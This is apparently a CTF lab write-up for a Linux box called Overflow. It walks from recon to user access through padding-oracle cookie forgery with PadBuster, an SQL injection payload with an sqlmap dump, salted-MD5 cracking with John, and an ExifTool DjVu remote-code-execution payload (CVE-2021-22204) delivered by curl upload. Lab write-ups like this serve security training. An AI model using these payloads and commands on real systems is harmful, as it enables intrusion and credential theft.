## Overview

Overflow is a hard-difficulty Linux box that chains three classic web flaws into a foothold. The login cookie is encrypted with AES in CBC mode but never authenticated, so a Padding Oracle attack forges an `admin` cookie. From there an SQL injection leaks CMS Made Simple password hashes that crack to a usable login, and a separate internal application processes uploaded images with an outdated ExifTool vulnerable to CVE-2021-22204 — giving remote code execution as `www-data`. This post covers recon through the user portion of the foothold.

Three chained web flaws with a named ExifTool CVE-2021-22204 as the RCE foothold, balanced against custom padding-oracle cookie forgery and a salted-MD5 John rule, making CVE and realism co-dominant.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH | default |
| 25/tcp | Postfix | SMTP |
| 80/tcp | Apache 2.4.29 (Ubuntu) | "Overflow Sec" site |

```bash
nmap -p- --min-rate=1000 -T4 10.129.7.78
nmap -sC -sV -p22,25,80 10.129.7.78
```

The web server on port 80 is the only real entry point. After registering and logging in, the app sets a session cookie named `auth`. A couple of additional virtual hosts surface during enumeration — add them to `/etc/hosts`:

```bash
echo "10.129.7.78 overflow.htb devbuild-job.overflow.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Tampering with a single character of the `auth` cookie returns an **`Invalid padding`** error. That distinguishable error is the tell-tale of a CBC Padding Oracle: the cookie is encrypted but not integrity-protected, and the server leaks one bit of information per malformed request.

A request seen in the browser's network tab — `/home/logs.php?name=admin` — is reachable once authenticated as admin. Appending a single quote to `name` blanks the page, and the classic boolean payload confirms injection:

```
/home/logs.php?name=admin') or 1=1 -- -
```

## Foothold

**1 — Padding Oracle: decrypt, then forge an admin cookie.** PadBuster decrypts the cookie (revealing a `user=<name>` plaintext) and then encrypts an attacker-chosen plaintext without ever knowing the key:

```bash
padbuster http://overflow.htb/login.php <auth-cookie> 8 -cookie auth=<auth-cookie>
padbuster http://overflow.htb/login.php <auth-cookie> 8 -cookie auth=<auth-cookie> --plaintext user=admin
```

Swapping in the forged cookie logs us in as `admin`.

**2 — SQL injection: dump and crack CMS credentials.** The injectable `logs.php` parameter lets sqlmap pull the CMS Made Simple user table and the site salt. CMSMS stores passwords as `md5(sitemask + password)`, so a custom John rule that prepends the salt cracks one hash:

```bash
sqlmap -u "http://overflow.htb/home/logs.php?name=admin" --cookie "auth=<admin-cookie>" -D cmsmsdb -T cms_users,cms_siteprefs --dump --batch
# john-local.conf:  [List.Rules:CMSMS]  A0"<sitemask>"
john --config=john-local.conf --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-MD5 --rules=CMSMS hashes.txt
```

The cracked `editor` credentials log into the **devbuild-job** virtual host, which exposes a résumé upload form (`/home/profile/index.php?id=1` → `resume_upload.php`). A comment in the page source shows uploads are passed to ExifTool.

**3 — ExifTool DjVu RCE (CVE-2021-22204).** The server runs ExifTool 11.92, which evaluates DjVu annotation metadata as Perl code. A malicious DjVu file (renamed `.jpg`) carrying a `qx{...}` annotation executes commands when the metadata is parsed. Conveniently, the app reflects the parsed `Copyright` field back in the upload response, so command output can be read directly — no reverse shell required:

```bash
# Build the DjVu payload (djvumake from djvulibre, or assemble the IFF chunks in Python)
printf '(metadata (Copyright "\\" . qx{id} . \\" b "))' > exploit
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit && mv exploit.djvu exploit.jpg

# Upload and read the reflected output
curl -s -b cookies -H "Host: devbuild-job.overflow.htb" \
  -F "file=@exploit.jpg;type=image/jpeg" \
  "http://10.129.7.78/home/profile/resume_upload.php" | grep -i copyright
```

The reflected `Copyright` field returns `uid=33(www-data)` — code execution as `www-data`. From here a web-root config file leaks credentials that lead onward to the user account.

## User flag

```bash
cat /home/<user>/user.txt   # HTB{...}
```

Access as the foothold user is achieved; the flag value is redacted.

Privilege escalation is left as an exercise — this post stops at user.
